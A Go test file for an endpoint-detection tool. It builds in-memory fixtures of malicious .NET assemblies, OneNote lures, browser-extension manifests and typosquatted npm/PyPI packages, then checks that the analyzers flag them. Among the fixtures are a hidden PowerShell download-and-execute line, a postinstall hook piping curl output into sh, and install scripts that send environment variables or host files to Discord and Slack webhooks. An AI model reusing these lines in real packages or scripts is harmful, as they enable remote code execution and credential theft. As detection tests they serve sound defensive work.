// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

// Fixtures and tests for the .NET, OneNote, extension/package, correlation and
// SARIF additions. Every fixture is built in memory; no binary blobs are
// checked in and nothing here runs or fetches anything.

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/binary"
	"encoding/json"
	"math/rand"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
)

// ---------- .NET fixture ----------

type dnFix struct {
	asm        string
	refs       []string
	typeRefs   []string
	memberRefs []string
	pinvokes   [][2]string
	resources  [][2]any // name, []byte
	markers    []string
	weird      int
}

func le32(v uint32) []byte { b := make([]byte, 4); binary.LittleEndian.PutUint32(b, v); return b }
func le16(v uint16) []byte { b := make([]byte, 2); binary.LittleEndian.PutUint16(b, v); return b }
func pad4(b []byte) []byte {
	for len(b)%4 != 0 {
		b = append(b, 0)
	}
	return b
}

func buildDotNet(f dnFix) []byte {
	strs := []byte{0}
	addS := func(s string) uint32 {
		o := uint32(len(strs))
		strs = append(strs, s...)
		strs = append(strs, 0)
		return o
	}
	for _, m := range f.markers {
		addS(m)
	}
	for i := 0; i < f.weird; i++ {
		addS("\u200b\u200e\x01n" + string(rune('a'+i%26)))
	}
	for i := 0; i < 30; i++ { // some plain names so the weird ratio is meaningful
		addS("Name" + string(rune('A'+i%26)) + string(rune('a'+i/26)))
	}
	tabs := map[int][][]uint32{}
	tabs[0x00] = [][]uint32{{0, addS("app.exe"), 0, 0, 0}}
	for _, t := range f.typeRefs {
		tabs[0x01] = append(tabs[0x01], []uint32{0, addS(t), 0})
	}
	tabs[0x02] = [][]uint32{{0, addS("<Module>"), 0, 0, 1, 1}}
	for _, m := range f.memberRefs {
		tabs[0x0A] = append(tabs[0x0A], []uint32{0, addS(m), 0})
	}
	dllIdx := map[string]uint32{}
	for i, p := range f.pinvokes {
		if _, ok := dllIdx[p[0]]; !ok {
			tabs[0x1A] = append(tabs[0x1A], []uint32{addS(p[0])})
			dllIdx[p[0]] = uint32(len(tabs[0x1A]))
		}
		tabs[0x06] = append(tabs[0x06], []uint32{0, 0, 0, addS("m" + string(rune('a'+i))), 0, 1})
		tabs[0x1C] = append(tabs[0x1C], []uint32{0, uint32(i+1)<<1 | 1, addS(p[1]), dllIdx[p[0]]})
	}
	if f.asm != "" {
		tabs[0x20] = [][]uint32{{0, 1, 2, 3, 4, 0, 0, addS(f.asm), 0}}
	}
	for _, r := range f.refs {
		tabs[0x23] = append(tabs[0x23], []uint32{4, 0, 0, 0, 0, 0, addS(r), 0, 0})
	}
	var resBlob []byte
	for _, r := range f.resources {
		off := uint32(len(resBlob))
		body := r[1].([]byte)
		resBlob = append(resBlob, le32(uint32(len(body)))...)
		resBlob = append(resBlob, body...)
		tabs[0x28] = append(tabs[0x28], []uint32{off, 0, addS(r[0].(string)), 0})
	}
	var rows [64]uint32
	var valid uint64
	for t, rs := range tabs {
		rows[t] = uint32(len(rs))
		valid |= 1 << uint(t)
	}
	rowSize, colW := dnLayout(rows, 2, 2, 2)
	_ = rowSize
	tab := []byte{0, 0, 0, 0, 2, 0, 0, 1}
	tab = append(tab, le32(uint32(valid))...)
	tab = append(tab, le32(uint32(valid>>32))...)
	tab = append(tab, make([]byte, 8)...)
	for i := 0; i < 64; i++ {
		if valid&(1<<uint(i)) != 0 {
			tab = append(tab, le32(rows[i])...)
		}
	}
	for t := 0; t < 64; t++ {
		for _, row := range tabs[t] {
			for c, v := range row {
				if colW[t][c] == 2 {
					tab = append(tab, le16(uint16(v))...)
				} else {
					tab = append(tab, le32(v)...)
				}
			}
		}
	}
	strs = pad4(strs)
	tab = pad4(tab)
	us := []byte{0, 0, 0, 0}
	guid := make([]byte, 16)
	blob := []byte{0, 0, 0, 0}
	streams := []struct {
		name string
		body []byte
	}{{"#~", tab}, {"#Strings", strs}, {"#US", us}, {"#GUID", guid}, {"#Blob", blob}}
	ver := []byte("v4.0.30319\x00\x00")
	hdr := append([]byte("BSJB"), le16(1)...)
	hdr = append(hdr, le16(1)...)
	hdr = append(hdr, le32(0)...)
	hdr = append(hdr, le32(uint32(len(ver)))...)
	hdr = append(hdr, ver...)
	hdr = append(hdr, le16(0)...)
	hdr = append(hdr, le16(uint16(len(streams)))...)
	hlen := len(hdr)
	for _, s := range streams {
		hlen += 8 + len(pad4(append([]byte(s.name), 0)))
	}
	off := hlen
	md := hdr
	for _, s := range streams {
		md = append(md, le32(uint32(off))...)
		md = append(md, le32(uint32(len(s.body)))...)
		md = append(md, pad4(append([]byte(s.name), 0))...)
		off += len(s.body)
	}
	for _, s := range streams {
		md = append(md, s.body...)
	}
	md = pad4(md)
	const va = 0x2000
	mdRVA := uint32(va + 72)
	resRVA := mdRVA + uint32(len(md))
	clr := make([]byte, 72)
	binary.LittleEndian.PutUint32(clr[0:], 72)
	binary.LittleEndian.PutUint16(clr[4:], 2)
	binary.LittleEndian.PutUint16(clr[6:], 5)
	binary.LittleEndian.PutUint32(clr[8:], mdRVA)
	binary.LittleEndian.PutUint32(clr[12:], uint32(len(md)))
	binary.LittleEndian.PutUint32(clr[16:], 1)
	binary.LittleEndian.PutUint32(clr[24:], resRVA)
	binary.LittleEndian.PutUint32(clr[28:], uint32(len(resBlob)))
	sect := append(append(clr, md...), resBlob...)

	pe := make([]byte, 0x200)
	pe[0], pe[1] = 'M', 'Z'
	binary.LittleEndian.PutUint32(pe[0x3c:], 0x40)
	copy(pe[0x40:], "PE\x00\x00")
	binary.LittleEndian.PutUint16(pe[0x44:], 0x14c)
	binary.LittleEndian.PutUint16(pe[0x46:], 1)
	binary.LittleEndian.PutUint16(pe[0x54:], 224)
	opt := 0x58
	binary.LittleEndian.PutUint16(pe[opt:], 0x10b)
	dd := opt + 96
	binary.LittleEndian.PutUint32(pe[dd+14*8:], va)
	binary.LittleEndian.PutUint32(pe[dd+14*8+4:], 72)
	sh := opt + 224
	copy(pe[sh:], ".text")
	binary.LittleEndian.PutUint32(pe[sh+8:], uint32(len(sect)))
	binary.LittleEndian.PutUint32(pe[sh+12:], va)
	binary.LittleEndian.PutUint32(pe[sh+16:], uint32(len(sect)))
	binary.LittleEndian.PutUint32(pe[sh+20:], 0x200)
	return append(pe, sect...)
}

func runInspect(kind string, data []byte, text, name string) *InspectReport {
	return RunAnalyzers(context.Background(), InspectInput{Kind: kind, Data: data, Text: text, Name: name})
}

func randBytes(n int, seed int64) []byte {
	b := make([]byte, n)
	rand.New(rand.NewSource(seed)).Read(b)
	return b
}

func evilDotNet() []byte {
	pe := append([]byte("MZ"), make([]byte, 600)...)
	return buildDotNet(dnFix{
		asm: "Updater", refs: []string{"mscorlib", "System.Management.Automation"},
		typeRefs:   []string{"Assembly", "Marshal", "Object"},
		memberRefs: []string{"Load", "FromBase64String", "GetDelegateForFunctionPointer"},
		pinvokes:   [][2]string{{"kernel32.dll", "VirtualAlloc"}, {"kernel32.dll", "WriteProcessMemory"}, {"kernel32.dll", "CreateRemoteThread"}},
		resources:  [][2]any{{"payload.bin", pe}, {"blob.dat", randBytes(32<<10, 1)}, {"tiny.txt", []byte("hello")}},
		markers:    []string{"ConfusedByAttribute"},
	})
}

func TestDotNetGolden(t *testing.T) {
	r := runInspect(InspectKindFile, evilDotNet(), "", "u.exe")
	if len(r.Errors) != 0 {
		t.Fatalf("errors: %v", r.Errors)
	}
	fileMustHave(t, r, "dotnet-assembly", "dotnet-pinvoke-injection", "dotnet-reflective-load", "dotnet-powershell-host",
		"obf-dotnet-obfuscator", "dotnet-resource-pe", "dotnet-resource-packed", "dotnet-pinvoke")
	if r.Format != "PE (.NET)" && !strings.Contains(r.Format, "PE") {
		t.Fatalf("format %q", r.Format)
	}
	m, _ := r.Meta["file-dotnet.dotnet"].(map[string]any)
	if m == nil || m["assembly"] != "Updater" || m["version"] != "1.2.3.4" || m["runtime"] != "v4.0.30319" {
		t.Fatalf("meta: %#v", m)
	}
	if refs, _ := m["assembly_refs"].([]string); len(refs) != 2 {
		t.Fatalf("refs: %#v", m["assembly_refs"])
	}
	if r.Level == "clean" {
		t.Fatalf("expected a verdict, score=%d", r.Score)
	}
}

func TestDotNetBenign(t *testing.T) {
	d := buildDotNet(dnFix{asm: "Hello", refs: []string{"mscorlib", "System.Core"}, typeRefs: []string{"Console", "Object"},
		memberRefs: []string{"WriteLine"}, resources: [][2]any{{"strings.txt", []byte("plain text resource")}}})
	r := runInspect(InspectKindFile, d, "", "hello.exe")
	fileMustHave(t, r, "dotnet-assembly")
	for id := range fileFindingIDs(r) {
		if strings.HasPrefix(id, "dotnet-") && id != "dotnet-assembly" || strings.HasPrefix(id, "obf-dotnet") {
			t.Errorf("benign assembly flagged: %s", id)
		}
	}
	if r.Level != "clean" {
		t.Fatalf("level %s score %d factors %v", r.Level, r.Score, r.Factors)
	}
}

func TestDotNetRenamedNames(t *testing.T) {
	r := runInspect(InspectKindFile, buildDotNet(dnFix{asm: "X", weird: 40}), "", "")
	fileMustHave(t, r, "obf-dotnet-names")
}

func TestDotNetNativePEIgnored(t *testing.T) {
	// A PE with no CLR directory must not produce dotnet findings.
	d := buildDotNet(dnFix{asm: "X"})
	binary.LittleEndian.PutUint32(d[0x58+96+14*8:], 0)
	r := runInspect(InspectKindFile, d, "", "")
	if _, ok := fileFindingIDs(r)["dotnet-assembly"]; ok {
		t.Fatal("native PE treated as .NET")
	}
}

func TestDotNetHostileInputs(t *testing.T) {
	good := evilDotNet()
	// every truncation and a stripe of single-byte corruptions must not panic
	for n := 0; n < len(good); n += 37 {
		if p := fileSafeCall(func() { analyzeDotNet(context.Background(), good[:n], fileTestBuilder()) }); p {
			t.Fatalf("panic at truncation %d", n)
		}
	}
	rng := rand.New(rand.NewSource(7))
	for i := 0; i < 400; i++ {
		c := append([]byte(nil), good...)
		for k := 0; k < 4; k++ {
			c[0x200+rng.Intn(len(c)-0x200)] = byte(rng.Intn(256))
		}
		if fileSafeCall(func() { analyzeDotNet(context.Background(), c, fileTestBuilder()) }) {
			t.Fatalf("panic on mutation %d", i)
		}
	}
	// absurd row counts must be refused, not allocated
	c := append([]byte(nil), good...)
	i := bytes.Index(c, []byte("BSJB"))
	if i < 0 {
		t.Fatal("no metadata")
	}
	tabAt := bytes.Index(c[i:], []byte{0, 0, 0, 0, 2, 0, 0, 1})
	if tabAt >= 0 {
		binary.LittleEndian.PutUint32(c[i+tabAt+24:], 0xFFFFFFFF)
	}
	b := fileTestBuilder()
	analyzeDotNet(context.Background(), c, b)
	if len(b.r.Findings) > 5 {
		t.Fatalf("hostile row count produced %d findings", len(b.r.Findings))
	}
}

func TestDotNetTableCap(t *testing.T) {
	var refs []string
	for i := 0; i < dnMaxRefs+50; i++ {
		refs = append(refs, "Lib"+strings.Repeat("x", i%5))
	}
	r := runInspect(InspectKindFile, buildDotNet(dnFix{asm: "Big", refs: refs}), "", "")
	m, _ := r.Meta["file-dotnet.dotnet"].(map[string]any)
	if got, _ := m["assembly_refs"].([]string); len(got) > 80 {
		t.Fatalf("assembly_refs not capped: %d", len(got))
	}
	found := false
	for _, l := range r.LimitsHit {
		found = found || l == "file-dotnet:dotnet-table-rows"
	}
	if !found {
		t.Fatalf("limits_hit=%v", r.LimitsHit)
	}
}

// ---------- OneNote fixture ----------

func u16le(s string) []byte {
	var b []byte
	for _, r := range s {
		b = append(b, byte(r), byte(r>>8))
	}
	return b
}

func oneEmbedRec(payload []byte) []byte {
	rec := append([]byte(nil), oneHeaderGUID...)
	rec = append(rec, make([]byte, 8)...)
	binary.LittleEndian.PutUint64(rec[16:], uint64(len(payload)))
	rec = append(rec, make([]byte, 12)...)
	rec = append(rec, payload...)
	for len(rec)%8 != 0 {
		rec = append(rec, 0)
	}
	return append(rec, oneFooterGUID...)
}

func buildOneNote(payloads [][]byte, text ...string) []byte {
	b := append([]byte(nil), oneFileGUID...)
	b = append(b, make([]byte, 1024)...)
	for _, t := range text {
		b = append(b, u16le(t)...)
		b = append(b, 0, 0, 0, 0)
	}
	for _, p := range payloads {
		b = append(b, oneEmbedRec(p)...)
		b = append(b, make([]byte, 16)...)
	}
	return b
}

func TestOneNoteGolden(t *testing.T) {
	pe := append([]byte("MZ\x90\x00"), make([]byte, 300)...)
	script := []byte("@echo off\r\npowershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/p.ps1')\"\r\n")
	d := buildOneNote([][]byte{pe, script}, "Double click to view document", "invoice.hta", "Page 1")
	r := runInspect(InspectKindFile, d, "", "notes.one")
	if len(r.Errors) != 0 {
		t.Fatalf("errors %v", r.Errors)
	}
	fileMustHave(t, r, "onenote-embedded-executable", "onenote-embedded-script", "onenote-launcher-name", "onenote-lure-text")
	if r.Format != "OneNote" {
		t.Fatalf("format %q", r.Format)
	}
	if !fileHasIOC(r, "url", "http://203.0.113.9/p.ps1") {
		t.Fatalf("missing url IOC: %+v", r.IOCs)
	}
	if r.Level == "clean" {
		t.Fatalf("score %d", r.Score)
	}
	m, _ := r.Meta["file-onenote.onenote"].(map[string]any)
	if m == nil || m["embeds"] != 2 {
		t.Fatalf("meta %#v", m)
	}
}

func TestOneNoteBenign(t *testing.T) {
	r := runInspect(InspectKindFile, buildOneNote(nil, "Meeting notes", "Agenda item one"), "", "n.one")
	fileMustHave(t, r, "onenote-no-embeds")
	if r.Level != "clean" {
		t.Fatalf("benign onenote %s %v", r.Level, r.Factors)
	}
	// an attached PNG-like blob is not flagged
	r = runInspect(InspectKindFile, buildOneNote([][]byte{append([]byte("\x89PNG\r\n\x1a\n"), make([]byte, 64)...)}, "photo.png"), "", "n.one")
	if r.Level != "clean" {
		t.Fatalf("png attachment flagged: %v", r.Factors)
	}
}

func TestOneNoteLimits(t *testing.T) {
	// length field pointing past the end of the file
	d := append([]byte(nil), oneFileGUID...)
	d = append(d, make([]byte, 64)...)
	rec := append([]byte(nil), oneHeaderGUID...)
	rec = append(rec, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f)
	rec = append(rec, make([]byte, 40)...)
	d = append(d, rec...)
	r := runInspect(InspectKindFile, d, "", "")
	found := false
	for _, l := range r.LimitsHit {
		found = found || l == "file-onenote:onenote-embed-range"
	}
	if !found || len(r.Errors) != 0 {
		t.Fatalf("limits=%v errors=%v", r.LimitsHit, r.Errors)
	}
	// more embeds than the cap
	var ps [][]byte
	for i := 0; i < oneMaxEmbeds+10; i++ {
		ps = append(ps, []byte{byte(i), 1, 2, 3, 4})
	}
	r = runInspect(InspectKindFile, buildOneNote(ps), "", "")
	found = false
	for _, l := range r.LimitsHit {
		found = found || l == "file-onenote:onenote-embeds"
	}
	if !found {
		t.Fatalf("limits=%v", r.LimitsHit)
	}
}

// ---------- extensions and packages ----------

const evilManifest = `{
 "manifest_version": 2, "name": "PDF Helper", "version": "1.0",
 "permissions": ["cookies", "webRequest", "webRequestBlocking", "nativeMessaging", "debugger", "<all_urls>"],
 "content_security_policy": "script-src 'self' 'unsafe-eval' https://cdn.evil.example; object-src 'self'",
 "content_scripts": [{"matches": ["<all_urls>"], "js": ["c.js"], "run_at": "document_start"}],
 "update_url": "https://updates.evil.example/u.xml",
 "chrome_settings_overrides": {"search_provider": {"name": "x"}}
}`

const benignManifest = `{
 "manifest_version": 3, "name": "Tab Counter", "version": "2.1",
 "permissions": ["storage", "activeTab"],
 "content_security_policy": {"extension_pages": "script-src 'self'; object-src 'self'"},
 "action": {"default_popup": "p.html"}
}`

func TestExtensionManifest(t *testing.T) {
	r := runInspect(InspectKindLockfile, nil, evilManifest, "manifest.json")
	fileMustHave(t, r, "ext-perm-nativemessaging", "ext-perm-debugger", "ext-perm-cookies", "ext-broad-host-access",
		"ext-cookies-all-sites", "ext-intercept-all-sites", "ext-csp-unsafe-eval", "ext-remote-code", "ext-self-hosted-update",
		"ext-settings-override", "ext-content-script-all-start")
	if !fileHasIOC(r, "url", "https://cdn.evil.example") {
		t.Fatalf("iocs %+v", r.IOCs)
	}
	if r.Level == "clean" {
		t.Fatal("clean")
	}
	// Firefox flavour still parsed, and benign MV3 is clean
	r = runInspect(InspectKindLockfile, nil, benignManifest, "manifest.json")
	for id := range fileFindingIDs(r) {
		if strings.HasPrefix(id, "ext-") {
			t.Errorf("benign extension flagged: %s", id)
		}
	}
	ff := `{"manifest_version":2,"name":"x","applications":{"gecko":{"id":"a@b"}},"permissions":["nativeMessaging","https://*/*"]}`
	r = runInspect(InspectKindLockfile, nil, ff, "manifest.json")
	fileMustHave(t, r, "ext-perm-nativemessaging", "ext-broad-host-access")
}

func tgz(files map[string]string) []byte {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	names := make([]string, 0, len(files))
	for n := range files {
		names = append(names, n)
	}
	for _, n := range names {
		tw.WriteHeader(&tar.Header{Name: n, Mode: 0644, Size: int64(len(files[n])), Typeflag: tar.TypeReg})
		tw.Write([]byte(files[n]))
	}
	tw.Close()
	gz.Close()
	return buf.Bytes()
}

func zipOf(files map[string]string) []byte {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for n, c := range files {
		w, _ := zw.Create(n)
		w.Write([]byte(c))
	}
	zw.Close()
	return buf.Bytes()
}

const evilNpmJSON = `{"name":"left-padd","version":"1.0.0","scripts":{"postinstall":"node setup.js","test":"echo ok"}}`
const evilSetupJS = `const https=require('https');const d=JSON.stringify(process.env);
https.request({host:'discord.com',path:'/api/webhooks/123/abc',method:'POST'}).end(d);
eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString());
require('fs').readFileSync(process.env.HOME+'/.npmrc');`

func TestNPMInstallScripts(t *testing.T) {
	// text form: only the hook line is visible
	r := runInspect(InspectKindLockfile, nil, `{"name":"x","version":"1.0.0","scripts":{"postinstall":"curl -s http://203.0.113.5/i.sh | sh"}}`, "package.json")
	fileMustHave(t, r, "pkg-download-exec")
	// tarball form: the script file the hook names is read too
	d := tgz(map[string]string{"package/package.json": evilNpmJSON, "package/setup.js": evilSetupJS})
	r = runInspect(InspectKindFile, d, "", "left-padd-1.0.0.tgz")
	fileMustHave(t, r, "pkg-exfil-webhook", "pkg-obfuscated-eval", "pkg-env-harvest", "pkg-credential-files")
	if r.Level == "clean" {
		t.Fatal("clean")
	}
	// benign hooks stay quiet
	for _, h := range []string{"node-gyp rebuild", "husky install", "npm run build", "tsc -p tsconfig.json"} {
		r = runInspect(InspectKindLockfile, nil, `{"name":"x","version":"1.0.0","scripts":{"postinstall":"`+h+`"}}`, "package.json")
		for id := range fileFindingIDs(r) {
			if strings.HasPrefix(id, "pkg-") || strings.HasPrefix(id, "npm-") {
				t.Errorf("benign hook %q flagged %s", h, id)
			}
		}
	}
	// an unfamiliar hook is a low note only
	r = runInspect(InspectKindLockfile, nil, `{"name":"x","version":"1.0.0","scripts":{"postinstall":"node scripts/post.js"}}`, "package.json")
	fileMustHave(t, r, "npm-install-script")
	if r.Level != "clean" {
		t.Fatalf("level %s", r.Level)
	}
}

const evilSetupPy = `from setuptools import setup
from setuptools.command.install import install
import os, base64, urllib.request
class PostInstall(install):
    def run(self):
        install.run(self)
        os.system("curl -s https://hooks.slack.com/services/T0/B0/x -d @/etc/hostname")
        exec(base64.b64decode("cHJpbnQoMSk="))
setup(name="reqeusts", version="1.0", cmdclass={"install": PostInstall})
`

const benignSetupPy = `from setuptools import setup, find_packages
setup(name="mylib", version="1.0", packages=find_packages(), install_requires=["requests"])
`

func TestSetupPy(t *testing.T) {
	r := runInspect(InspectKindScript, nil, evilSetupPy, "setup.py")
	fileMustHave(t, r, "pypi-cmdclass-hook", "pkg-exfil-webhook", "pkg-obfuscated-eval")
	r = runInspect(InspectKindScript, nil, benignSetupPy, "setup.py")
	for id := range fileFindingIDs(r) {
		if strings.HasPrefix(id, "pkg-") || strings.HasPrefix(id, "pypi-") {
			t.Errorf("benign setup.py flagged: %s", id)
		}
	}
	// sdist form
	r = runInspect(InspectKindFile, tgz(map[string]string{"reqeusts-1.0/setup.py": evilSetupPy}), "", "reqeusts-1.0.tar.gz")
	fileMustHave(t, r, "pypi-cmdclass-hook")
	// CRX-style zip carrying a manifest
	r = runInspect(InspectKindFile, zipOf(map[string]string{"manifest.json": evilManifest, "c.js": "1"}), "", "e.zip")
	fileMustHave(t, r, "ext-perm-debugger")
}

func TestPkgLimits(t *testing.T) {
	files := map[string]string{"package/package.json": evilNpmJSON}
	for i := 0; i < pkgMaxMembers+20; i++ {
		files["package/f/"+strings.Repeat("a", 1+i%7)+"/"+strconv.Itoa(i)+".txt"] = "x"
	}
	r := runInspect(InspectKindFile, tgz(files), "", "big.tgz")
	if len(r.Errors) != 0 {
		t.Fatalf("errors %v", r.Errors)
	}
	// text truncation
	r = runInspect(InspectKindLockfile, nil, `{"manifest_version":2,"name":"x","pad":"`+strings.Repeat("a", pkgMaxText+10)+`"}`, "manifest.json")
	found := false
	for _, l := range r.LimitsHit {
		found = found || strings.Contains(l, "pkg-text-truncated")
	}
	if !found {
		t.Fatalf("limits %v", r.LimitsHit)
	}
	// invalid JSON is an info note, not an error
	r = runInspect(InspectKindLockfile, nil, `{"manifest_version": 2, "name": `, "manifest.json")
	if len(r.Errors) != 0 {
		t.Fatalf("errors %v", r.Errors)
	}
}

// ---------- correlation ----------

func clusterRep(id, sha string, iocs ...string) *InspectReport {
	r := &InspectReport{ID: id, SHA256: sha, Kind: InspectKindFile, Level: "low", Score: 20, Name: id}
	for _, s := range iocs {
		i := strings.IndexByte(s, '=')
		r.IOCs = append(r.IOCs, InspectIOC{Type: s[:i], Value: s[i+1:]})
	}
	return r
}

func TestClusterGolden(t *testing.T) {
	a := clusterRep("a", "aa", "url=http://203.0.113.50/x", "domain=evil.example")
	b := clusterRep("b", "bb", "url=http://203.0.113.50/x", "ipv4=203.0.113.50")
	c := clusterRep("c", "cc", "domain=evil.example") // links to a through one strong factor
	d := clusterRep("d", "dd", "path=/tmp/x")
	e := clusterRep("e", "ee", "path=/tmp/x") // only a weak factor: not linked at threshold 1
	f := clusterRep("f", "ff", "url=http://198.51.100.1/y")
	res := ClusterInspectReports([]*InspectReport{a, b, c, d, e, f}, ClusterOptions{})
	if res.Count != 1 || res.Clusters[0].Size != 3 || res.Singletons != 3 {
		t.Fatalf("count=%d clusters=%+v singletons=%d", res.Count, res.Clusters, res.Singletons)
	}
	cl := res.Clusters[0]
	if len(cl.SharedFactors) < 2 || cl.SharedFactors[0].Count < 2 || len(cl.Links) == 0 || cl.Explanation == "" || !strings.HasPrefix(cl.ID, "clu-") {
		t.Fatalf("cluster %+v", cl)
	}
	ids := map[string]bool{}
	for _, m := range cl.Members {
		ids[m.ID] = true
	}
	if !ids["a"] || !ids["b"] || !ids["c"] {
		t.Fatalf("members %v", ids)
	}
	// lowering the threshold links the weak-only pair
	res = ClusterInspectReports([]*InspectReport{a, b, c, d, e, f}, ClusterOptions{MinScore: 0.4})
	if res.Count != 2 {
		t.Fatalf("min_score 0.4 clusters=%d", res.Count)
	}
	// deterministic
	r2 := ClusterInspectReports([]*InspectReport{f, e, d, c, b, a}, ClusterOptions{})
	if r2.Clusters[0].ID != ClusterInspectReports([]*InspectReport{a, b, c, d, e, f}, ClusterOptions{}).Clusters[0].ID {
		t.Fatal("cluster id depends on input order")
	}
}

func TestClusterOwnAndEmbeddedHash(t *testing.T) {
	child := clusterRep("child", strings.Repeat("c", 64))
	dropper := clusterRep("dropper", strings.Repeat("d", 64), "sha256="+strings.Repeat("c", 64))
	res := ClusterInspectReports([]*InspectReport{child, dropper}, ClusterOptions{})
	if res.Count != 1 || res.Clusters[0].SharedFactors[0].Type != "sha256" {
		t.Fatalf("%+v", res)
	}
}

func TestClusterDigestFactors(t *testing.T) {
	a := clusterRep("a", "aa")
	b := clusterRep("b", "bb")
	a.Meta = map[string]any{"similarity.digests": SimDigests{ImpHash: "abc123"}}
	b.Meta = map[string]any{"similarity.digests": map[string]any{"imphash": "ABC123"}} // JSON-shaped, case differs
	res := ClusterInspectReports([]*InspectReport{a, b}, ClusterOptions{})
	if res.Count != 1 || res.Clusters[0].SharedFactors[0].Type != "imphash" {
		t.Fatalf("%+v", res)
	}
}

func TestClusterCommonAndLimits(t *testing.T) {
	var reps []*InspectReport
	for i := 0; i < 12; i++ {
		reps = append(reps, clusterRep("r"+string(rune('a'+i)), "s"+string(rune('a'+i)), "domain=cdn.shared.example", "domain=schemas.microsoft.com"))
	}
	res := ClusterInspectReports(reps, ClusterOptions{})
	if res.Count != 0 || len(res.Common) == 0 {
		t.Fatalf("ubiquitous factor must not cluster: %+v", res)
	}
	// cluster output limit
	var many []*InspectReport
	for g := 0; g < 4; g++ {
		for k := 0; k < 2; k++ {
			many = append(many, clusterRep("g"+string(rune('a'+g))+string(rune('0'+k)), "h"+string(rune('a'+g))+string(rune('0'+k)), "domain=grp"+string(rune('a'+g))+".example"))
		}
	}
	res = ClusterInspectReports(many, ClusterOptions{Limit: 2})
	if res.Count != 2 || !containsStr(res.LimitsHit, "clusters") {
		t.Fatalf("%+v", res)
	}
	// report cap
	var big []*InspectReport
	for i := 0; i < ClusterMaxReports+30; i++ {
		big = append(big, clusterRep(string(rune('A'+i%26))+strings.Repeat("x", i/26), "z"+strings.Repeat("y", i), "domain=u"+strings.Repeat("v", i)+".example"))
	}
	res = ClusterInspectReports(big, ClusterOptions{})
	if res.Considered != ClusterMaxReports || !containsStr(res.LimitsHit, "reports") {
		t.Fatalf("considered=%d limits=%v", res.Considered, res.LimitsHit)
	}
	// nil and empty input
	if r := ClusterInspectReports(nil, ClusterOptions{}); r.Count != 0 || r.Clusters == nil {
		t.Fatalf("%+v", r)
	}
}

// withCleanRing runs f with an empty report ring and restores it afterwards.
func withCleanRing(t *testing.T, f func()) {
	t.Helper()
	inspectRingMu.Lock()
	saved := inspectRing
	inspectRing = nil
	inspectRingMu.Unlock()
	defer func() {
		inspectRingMu.Lock()
		inspectRing = saved
		inspectRingMu.Unlock()
	}()
	f()
}

func getJSON(t *testing.T, mux *http.ServeMux, path string, code int) (map[string]any, string) {
	t.Helper()
	req := httptest.NewRequest("GET", path, nil)
	req.Header.Set("Authorization", "Bearer tok")
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != code {
		t.Fatalf("%s -> %d (%s)", path, w.Code, w.Body.String())
	}
	var m map[string]any
	_ = json.Unmarshal(w.Body.Bytes(), &m)
	return m, w.Header().Get("Content-Type")
}

// ---------- SARIF ----------

func TestSARIFShape(t *testing.T) {
	r := runInspect(InspectKindFile, evilDotNet(), "", `C:\Users\victim\Desktop\u.exe`)
	s := InspectSARIF(r)
	raw, err := json.Marshal(s)
	if err != nil {
		t.Fatal(err)
	}
	var back struct {
		Schema  string `json:"$schema"`
		Version string `json:"version"`
		Runs    []struct {
			Tool struct {
				Driver struct {
					Name  string `json:"name"`
					Rules []struct {
						ID string `json:"id"`
					} `json:"rules"`
				} `json:"driver"`
			} `json:"tool"`
			Results []struct {
				RuleID    string `json:"ruleId"`
				RuleIndex int    `json:"ruleIndex"`
				Level     string `json:"level"`
				Message   struct {
					Text string `json:"text"`
				} `json:"message"`
				Locations []struct {
					PhysicalLocation struct {
						ArtifactLocation struct {
							URI string `json:"uri"`
						} `json:"artifactLocation"`
					} `json:"physicalLocation"`
				} `json:"locations"`
			} `json:"results"`
			Artifacts []struct {
				Hashes map[string]string `json:"hashes"`
			} `json:"artifacts"`
		} `json:"runs"`
	}
	if err := json.Unmarshal(raw, &back); err != nil {
		t.Fatal(err)
	}
	if back.Version != "2.1.0" || !strings.Contains(back.Schema, "sarif-2.1.0") || len(back.Runs) != 1 {
		t.Fatalf("header %+v", back)
	}
	run := back.Runs[0]
	if run.Tool.Driver.Name == "" || len(run.Results) != len(r.Findings) || len(run.Artifacts) != 1 || run.Artifacts[0].Hashes["sha-256"] != r.SHA256 {
		t.Fatalf("run shape: results=%d findings=%d", len(run.Results), len(r.Findings))
	}
	levels := map[string]int{}
	for i, res := range run.Results {
		if run.Tool.Driver.Rules[res.RuleIndex].ID != res.RuleID {
			t.Fatalf("ruleIndex mismatch at %d", i)
		}
		if res.Locations[0].PhysicalLocation.ArtifactLocation.URI != "u.exe" {
			t.Fatalf("local path leaked: %q", res.Locations[0].PhysicalLocation.ArtifactLocation.URI)
		}
		levels[res.Level]++
	}
	if levels["error"] == 0 || levels["note"] == 0 {
		t.Fatalf("level mapping %v", levels)
	}
	// empty report, no name
	e := InspectSARIF(&InspectReport{SHA256: "abc", Findings: []InspectFinding{}})
	if rs := e["runs"].([]map[string]any)[0]["results"].([]map[string]any); len(rs) != 0 {
		t.Fatal("results not empty")
	}
	if u := e["runs"].([]map[string]any)[0]["artifacts"].([]map[string]any)[0]["location"].(map[string]any)["uri"]; u != "sha256:abc" {
		t.Fatalf("uri %v", u)
	}
}

// ---------- integration through the real endpoints ----------

func TestInspectEndToEndExtra(t *testing.T) {
	withCleanRing(t, func() {
		mux := http.NewServeMux()
		RegisterInspect(mux, "tok")
		RegisterInspectClusters(mux, "tok")
		RegisterInspectSARIF(mux, "tok")
		names := InspectAnalyzerNames()
		for _, want := range []string{"file-dotnet", "file-onenote", "pkg-manifest"} {
			if !containsStr(names[InspectKindFile], want) {
				t.Fatalf("%s not registered for file: %v", want, names[InspectKindFile])
			}
		}
		for _, k := range []string{InspectKindLockfile, InspectKindScript} {
			if !containsStr(names[k], "pkg-manifest") {
				t.Fatalf("pkg-manifest missing for %s", k)
			}
		}
		r := inspectPost(t, mux, "/v1/inspect/file?name=u.exe", "application/octet-stream", evilDotNet())
		fileMustHave(t, &r, "dotnet-pinvoke-injection", "dotnet-reflective-load")
		if !hasAnalyzer(r, "file-dotnet") || len(r.Errors) != 0 {
